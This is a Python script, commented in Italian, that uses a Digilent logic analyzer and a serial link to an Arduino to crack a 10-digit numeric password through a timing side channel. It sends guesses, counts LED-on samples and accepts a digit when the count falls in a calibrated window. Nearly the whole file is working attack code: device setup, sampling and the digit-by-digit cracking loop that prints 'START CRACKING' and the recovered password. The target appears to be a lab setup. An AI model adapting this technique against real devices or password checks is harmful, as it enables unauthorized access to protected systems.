import serial
from ctypes import *
from dwfconstants import *
import time
import sys
#from colorama import *          #modifica del colore nel terminale
#init()

#DEFINIZIONE FUNZIONE DI ACQUISIZIONE
def acquisisci(serial_input):
    #caricamento dei file dll sulla base del SO (windows, macOS, linux)
    if sys.platform.startswith("win"):
        dwf = cdll.dwf
    elif sys.platform.startswith("darwin"):
     dwf = cdll.LoadLibrary("/Library/Frameworks/dwf.frameworks/dwf")
    else:
        dwf = cdll.LoadLibrary("libdwf.so")

    #definizione delle variabili c_type necessarie perchè python usa dwf.py che chiama le funzioni di un file c
    hdwf = c_int()
    sts = c_byte()

    #versione del dwf
    #version = create_string_buffer(16)
    #dwf.FDwfGetVersion(version)
    #print("DWF Version: "+str(version.value))

    #apertura automatica del primo dispositivo disponibile
    dwf.FDwfDeviceOpen(-1, byref(hdwf)) #il -1 fa si che venga aperto il primo device scoperto
    if hdwf.value == hdwfNone.value:
        errore = create_string_buffer(512)
        dwf.FDwfGetLastErrorMsg(errore)
        print(errore.value)
        print("Impossibile aprire il dispositivo")
        quit()
    ##########
    #hzDI = c_double()
    ##########

    dwf.FDwfDigitalInDividerSet(hdwf, c_int(1))             #divisore di frequenza
    dwf.FDwfDigitalInSampleFormatSet(hdwf, c_int(16))       #formato del campionamento (numero di bit a partire da quello meno significativo)

    cSample = 4096                      #numero di campioni
    rgwSample = (c_uint16*cSample)()    #campioni in formato intero senza segno a 16 bit
    dwf.FDwfDigitalInBufferSizeSet(hdwf, c_int(cSample))    #dimensione del buffer

    #gestione dei trigger
    dwf.FDwfDigitalInTriggerAutoTimeoutSet(hdwf, c_double(0))   #disabilita l'auto trigger settandolo a 0 secondi
    dwf.FDwfDigitalInTriggerSourceSet(hdwf, trigsrcDetectorDigitalIn)   #setta la sorgente del trigger in modo tale da poter usare trigger sui pin digitali in ingresso
    dwf.FDwfDigitalInTriggerPositionSet(hdwf, c_uint(4096))         #setta a 4096 il numero di campioni da acquisire dopo il trigger
    #dwf.FDwfAnalogInTriggerConditionSet(hdwf, trigcondRisingPositive)    #setta la condizione dei trigger per l'oscilloscopio
    dwf.FDwfDigitalInTriggerSet(hdwf, 0, 0, 1, 0)       #configura il detector dei trigger, mettendo a 1 la condizione di rising edge
    time.sleep(1)

    #inzio dell'acquisizione
    dwf.FDwfDigitalInConfigure(hdwf, c_bool(0), c_bool(1))  #il secondo parametro 0 non fa resettare l'autotrigger timeout, mentre l'1 avvia l'acquisizione
    arduinoData.write(str(serial_input).encode('UTF-8'))
    #print(arduinoData.readline().decode('ascii'))
    while True:
        dwf.FDwfDigitalInStatus(hdwf, c_int(1), byref(sts)) #verifica dello stato; 1 vuol dire che il dato deve essere letto
        if sts.value == stsDone.value:          #se lo stato è Done, cioè l'acquisizione è terminata allora si ferma
            break
    dwf.FDwfDigitalInStatusData(hdwf, rgwSample, 2 * cSample)     #recupera i campioni acquisiti dal dispositivo e li copia nel buffer nel formato specificato con DigitalInSampleFormatSet
    samples = [0] * cSample           #vettore dei campioni inizializzato a 0
    temp = [0.0]*len(rgwSample)
    for c in range(0, len(temp)):   #memorizzazione dei campioni rilevati dal dispositivo
        temp[c] = rgwSample[c]
        samples[c] = temp[c]

    #chiusura dei dispositivi
    dwf.FDwfDeviceCloseAll()

    return samples.count(1)     #ritorno il numero di campioni pari a 1 (led acceso)


##############  MAIN    ###############
#apertura della porta seriale
arduinoData = serial.Serial('COM4', baudrate=9600)
time.sleep(2)
#pwd = 9999999998
#count = acquisisci(pwd)
#print(count)

print("************************* START CRACKING *************************")
pass_len = 10                   #lunghezza password
pwd = [0] * pass_len
time.sleep(2)
start = time.time()
for i in range(0, pass_len):
    for j in range(0, 10):
        pwd[i] = j
        #while True:
        #    smp_count = acquisisci(''.join(str(s) for s in pwd))
        #    print("STO PROVANDO LA PASSWORD: ",''.join(str(s) for s in pwd), " CON ", smp_count, " CAMPIONI")
        #    if smp_count > 0:
        #     break
        smp_count = acquisisci(''.join(str(s) for s in pwd))
        print("STO PROVANDO LA PASSWORD: ", ''.join(str(s) for s in pwd), " CON ", smp_count, " CAMPIONI")
        if(i == (pass_len - 1)):
            if(smp_count >= 1110):
                end = time.time()
                print("PASSWORD INDOVINATA: ", ''.join(str(s) for s in pwd), "IN", end-start, "SECONDI")
                print("************************* STOP CRACKING *************************")
                break
        else:
           if(smp_count >= (450 + (75*i)) and smp_count <=(600 + (75*i))):
               print("CARATTERE IN POSIZIONE ",str(i+1)," INDOVINATO: ",''.join(str(s) for s in pwd))
               break

